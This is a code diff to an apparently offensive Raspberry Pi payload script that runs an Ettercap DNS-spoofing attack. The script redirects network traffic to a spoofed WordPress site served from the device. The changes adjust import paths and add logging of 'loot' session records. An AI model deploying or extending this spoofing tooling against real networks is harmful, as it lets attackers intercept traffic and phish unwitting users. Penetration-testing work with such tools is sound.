@@ -34,10 +34,14 @@ import re
 def is_root():
     return os.geteuid() == 0
 
-# Dynamically add Raspyjack path
-RASPYJACK_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'Raspyjack'))
-if RASPYJACK_PATH not in sys.path:
-    sys.path.append(RASPYJACK_PATH)
+# Prefer /root/Raspyjack for imports; fallback to repo-relative Raspyjack sibling
+RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
+if RASPYJACK_ROOT not in sys.path:
+    sys.path.insert(0, RASPYJACK_ROOT)
+# Also add wifi subdir if present
+_wifi_dir = os.path.join(RASPYJACK_ROOT, 'wifi')
+if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
+    sys.path.insert(0, _wifi_dir)
 
 # ----------------------------
 # Third-party library imports 
@@ -86,11 +90,14 @@ FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bol
 # Dynamically get the best interface
 NETWORK_INTERFACE = get_best_interface()
 ETTERCAP_DNS_FILE = "/etc/ettercap/etter.dns"
-RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..', '..', 'Raspyjack'))
-SPOOF_SITE_WEBROOT = os.path.join(RASPYJACK_DIR, "DNSSpoof", "sites", "wordpress") # Default spoof site
+SPOOF_SITE_WEBROOT = os.path.join(RASPYJACK_ROOT, "DNSSpoof", "sites", "wordpress") # Default spoof site
 running = True
 ettercap_process = None
 php_server_process = None
+
+LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'attack_ettercap_dns')
+os.makedirs(LOOT_DIR, exist_ok=True)
+LAST_SPOOF_IP = None
 
 def draw(lines, color="lime"):
     """Clear the screen and draw text lines, centering each line."""
@@ -116,9 +123,24 @@ def cleanup(*_):
     global running
     running = False
     stop_dns_spoofing() # Ensure processes are killed on exit
+    save_loot_snapshot(status="cleanup")
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
+
+def save_loot_snapshot(status="", spoof_ip=None):
+    try:
+        ts = time.strftime('%Y-%m-%d_%H%M%S')
+        loot_file = os.path.join(LOOT_DIR, f"ettercap_dns_{ts}.txt")
+        with open(loot_file, 'w') as f:
+            f.write("Ettercap DNS Spoof Session\n")
+            f.write(f"Interface: {NETWORK_INTERFACE}\n")
+            f.write(f"Spoof IP: {spoof_ip or LAST_SPOOF_IP or 'N/A'}\n")
+            f.write(f"Status: {status}\n")
+            f.write(f"Timestamp: {ts}\n")
+        print(f"Loot saved to {loot_file}")
+    except Exception as e:
+        print(f"Loot save failed: {e}", file=sys.stderr)
 
 def get_default_gateway_ip():
     """Get the default gateway IP address."""
@@ -176,6 +198,8 @@ def start_dns_spoofing():
         draw(["Error: No IP", f"on {NETWORK_INTERFACE}"], "red")
         time.sleep(3)
         return False
+    global LAST_SPOOF_IP
+    LAST_SPOOF_IP = raspyjack_ip
     
     # 2. Modify etter.dns
     if not modify_etter_dns(raspyjack_ip):
@@ -234,6 +258,7 @@ def start_dns_spoofing():
             return False
         
         draw(["DNS Spoofing", "ACTIVE!", f"IP: {raspyjack_ip}"], "green")
+        save_loot_snapshot(status="started", spoof_ip=raspyjack_ip)
         return True
     except Exception as e:
         draw(["Ettercap", f"Error: {str(e)[:15]}"], "red")
@@ -282,6 +307,7 @@ def stop_dns_spoofing():
         print(f"Error resetting etter.dns: {e}", file=sys.stderr)
         
     draw(["DNS Spoofing", "STOPPED."], "yellow")
+    save_loot_snapshot(status="stopped")
     time.sleep(2)
 
 def check_dependencies():
@@ -343,6 +369,7 @@ if __name__ == '__main__':
         time.sleep(3)
     finally:
         stop_dns_spoofing() # Ensure all processes are killed
+        save_loot_snapshot(status="finalize")
         LCD.LCD_Clear()
         GPIO.cleanup()
         print("Ettercap DNS Spoofing payload finished.")
